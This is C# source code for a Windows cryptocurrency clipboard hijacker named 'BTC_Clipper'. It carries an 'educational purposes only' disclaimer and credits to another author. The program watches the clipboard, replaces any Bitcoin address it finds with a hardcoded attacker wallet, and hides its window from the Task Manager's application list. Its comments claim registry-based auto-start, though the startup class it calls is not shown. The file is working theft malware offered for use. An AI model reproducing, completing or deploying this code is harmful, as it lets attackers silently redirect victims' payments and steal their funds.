using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text.RegularExpressions;
using static BTC_Clipper.Program;
using Microsoft.Win32;
using System.IO;


//CREDITS GO 100% TO NYAN CAT
//HIS GITHUB :  https:github.com/NYAN-x-CAT

//This program Is distributed for educational purposes only!

/*MY EDITS:
 * REMOVED ETH & XMR CLIPPER
 * EDITED SOME CODE [SORRY FOR SPAGETHI IM NEW TO THIS SHIT]
 * ADDED AUTO STARTUP [PATH FOR EXE + REGISTRY ENTRY]
 * ONLY VISIBLE IN "DETAILS" UNDER TASKMANAGER
 */


namespace BTC_Clipper
{

    static class Program
    {
        public static string btc = "14pj14yKQ4tD8SUsAeE2btX2dNeiEJZ58E"; //BTC ADDRESS GETTING PASTED
        public readonly static Regex btcregex = new Regex(@"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b");

        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public static class NativeMethods
        {
            [DllImport("user32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool AddClipboardFormatListener(IntPtr hwnd);

            [DllImport("user32.dll", SetLastError = true)]
            public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

            public const int clp = 0x031D;
            public static IntPtr intpreclp = new IntPtr(-3);
        }

        //STEVEN
        static void Main()
        {
            new Thread(() => { Run(); }).Start();
            autorestart.startup();
        }
        public static void Run()
        {
            Application.Run(new ClipboardNotification.NotificationForm());
        }
    }
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    public static class Clipboard
    {
        public static string GetText()
        {
            string ReturnValue = string.Empty;
            Thread STAThread = new Thread(
                delegate ()
                {
                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            return ReturnValue;
        }

        public static void SetText(string txt)
        {
            Thread STAThread = new Thread(
                delegate ()
                {
                    System.Windows.Forms.Clipboard.SetText(txt);
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();
        }
    }
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    public sealed class ClipboardNotification
    {
        public class NotificationForm : Form
        {
            
            private static string currentClipboard = Clipboard.GetText();
            public NotificationForm()
            {
                NativeMethods.SetParent(Handle, NativeMethods.intpreclp);
                NativeMethods.AddClipboardFormatListener(Handle);
            }

            private bool RegexResult(Regex pattern)
            {
                if (pattern.Match(currentClipboard).Success) return true;
                else
                    return false;
            }

            protected override void WndProc(ref Message m)
            {
                if (m.Msg == NativeMethods.clp)
                {
                    currentClipboard = Clipboard.GetText();

                    if (RegexResult(btcregex) && !currentClipboard.Contains(btc))
                    {
                        string result = btcregex.Replace(currentClipboard, btc);
                        Clipboard.SetText(result);
                    }
                }
                base.WndProc(ref m);
            }
                protected override CreateParams CreateParams
            {
                get
                {
                    var cp = base.CreateParams;
                    cp.ExStyle |= 0x80; 
                    return cp;
                    //ONLY VISIBLE NOW IN DETAILS UNDER TASKMGR
                }
            }
        }
                
        }
    }
        

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////